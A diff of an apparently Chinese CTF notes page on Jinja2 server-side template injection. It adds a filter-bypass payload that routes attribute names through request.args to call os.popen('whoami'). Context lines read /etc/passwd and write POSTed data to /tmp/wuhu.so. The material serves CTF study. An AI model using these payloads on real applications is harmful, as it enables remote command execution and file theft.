@@ -484,7 +484,10 @@ a=var_dump(file_put_contents('/tmp/wuhu.so',$_POST['data']));&amp;amp;data=xxxxx
 &lt;li>
 &lt;p>&lt;code>request.args&lt;/code>&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{&amp;#39;&amp;#39;[request.args.class][request.args.base][request.args.subclasses]()[index](&amp;#39;/etc/passwd&amp;#39;).read() }}&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>class=__class__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>base=__base__&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>subclasses=__subclasses__
-&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>这种方式可以结合get和post，举例-&amp;gt;&lt;a href="https://qgieod1s9b.feishu.cn/docs/doccnNEAk0zZJDhi7bypQhF6eFf#RYhszr">[CTFshow 击剑杯]通关大佬&lt;/a>，在不同的字段处对传入参数的限制是不同的&lt;/p>
+&lt;pre tabindex="0">&lt;code>/edit?a=__init__&amp;amp;b=__globals__&amp;amp;c=__getitem__&amp;amp;d=os&amp;amp;e=popen&amp;amp;f=whoami&amp;amp;g=read
+POST: name={%25set%20r=request.args%25}&amp;amp;rank=1&amp;amp;speech={{(config|attr(r.a)|attr(r.b))|attr(r.c)(r.d)|attr(r.e)(r.f)|attr(r.g)()}}&amp;amp;time=2021年11月11日
+&lt;/code>&lt;/pre>&lt;/li>
 &lt;li>
 &lt;p>按字符串的方式走，也可&lt;/p>
 &lt;/li>
